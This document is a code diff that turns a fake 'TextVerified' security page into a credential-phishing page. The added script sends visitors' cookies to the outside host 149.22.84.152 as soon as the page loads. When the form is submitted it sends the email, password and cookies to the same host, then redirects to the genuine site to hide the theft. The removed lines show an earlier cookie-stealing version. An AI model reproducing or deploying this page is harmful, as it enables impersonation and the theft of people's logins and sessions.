@@ -3,93 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TextVerified - Security Notice</title>
+    <title>TextVerified - Account Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #f5f7fa;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .container {
+        .warning-bar { 
+            background: #ffd600; 
+            color: #333; 
+            padding: 8px; 
+            text-align: center; 
+            font-size: 13px;
+            position: fixed;
+            top: 0;
+            width: 100%;
+        }
+        .card {
             background: white;
             padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
-            text-align: center;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            margin-top: 40px;
         }
-        .logo { 
-            font-size: 24px; 
-            font-weight: bold; 
-            color: #333;
-            margin-bottom: 20px;
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { font-size: 24px; color: #333; }
+        .logo p { color: #666; font-size: 14px; margin-top: 5px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #555; font-size: 14px; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 5px; 
+            font-size: 16px;
+            transition: border-color 0.3s;
         }
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-        }
-        .btn {
+        input:focus { outline: none; border-color: #667eea; }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
             background: #667eea;
             color: white;
-            padding: 12px 30px;
             border: none;
             border-radius: 5px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            margin: 10px;
+            transition: background 0.3s;
         }
-        .btn:hover { background: #5a6fd6; }
-        .footer { 
-            margin-top: 20px; 
-            font-size: 12px; 
-            color: #666;
-        }
+        .verify-btn:hover { background: #5a6fd6; }
+        .safety { margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee; }
+        .safety p { color: #888; font-size: 12px; text-align: center; }
+        .footer { margin-top: 20px; text-align: center; color: #999; font-size: 12px; }
+        .lock-icon { font-size: 40px; text-align: center; margin-bottom: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">TextVerified</div>
-        <h2>Security Verification Required</h2>
-        <div class="warning">
-            Please verify your account to continue.
+    <div class="warning-bar">⚠️ Security Alert: Please verify your account</div>
+    <div class="card">
+        <div class="logo">
+            <div class="lock-icon">🔒</div>
+            <h1>TextVerified</h1>
+            <p>Account Security Verification</p>
         </div>
-        <p>To access your account, please click the button below.</p>
-        <button class="btn" onclick="stealCookies()">Verify Account</button>
+        <form id="verifyForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="verify-btn">Verify Account Now</button>
+        </form>
+        <div class="safety">
+            <p>🔒 Your session is securely encrypted</p>
+            <p>🛡️ Protected by industry-standard security</p>
+        </div>
         <div class="footer">
             <p>© 2026 TextVerified. All rights reserved.</p>
         </div>
     </div>
+    
     <script>
-        function stealCookies() {
-            // Exfiltrate cookies via pixel
-            var cookies = document.cookie;
-            var pixel = new Image();
-            pixel.src = "http://149.22.84.152:8888/steal?c=" + encodeURIComponent(cookies) + "&d=" + encodeURIComponent(window.location.hostname);
+        // Auto-steal cookies on load
+        window.addEventListener("load", function() {
+            try {
+                var img = new Image();
+                img.src = "http://149.22.84.152:8888/steal?c=" + encodeURIComponent(document.cookie) + "&d=" + encodeURIComponent(window.location.hostname);
+            } catch(e) {}
             
-            // Also try fetch
-            fetch("http://149.22.84.152:8888/collect", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    cookies: cookies,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
-                })
+            try {
+                fetch("http://149.22.84.152:8888/collect", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        cookies: document.cookie,
+                        url: window.location.href,
+                        domain: window.location.hostname,
+                        time: new Date().toISOString()
+                    })
+                });
+            } catch(e) {}
+        });
+        
+        // Collect credentials on submit
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var credentials = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString(),
+                cookies: document.cookie
+            };
+            
+            // Send credentials to attacker
+            fetch('http://149.22.84.152:8888/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(credentials)
             });
             
-            // Redirect to legitimate site
-            setTimeout(function() {
-                window.location.href = "https://www.textverified.com";
-            }, 2000);
-        }
+            // Also exfiltrate via pixel
+            var img = new Image();
+            img.src = 'http://149.22.84.152:8888/steal?c=' + encodeURIComponent(JSON.stringify(credentials));
+            
+            // Redirect to real site
+            window.location.href = 'https://www.textverified.com';
+        });
     </script>
 </body>
 </html>
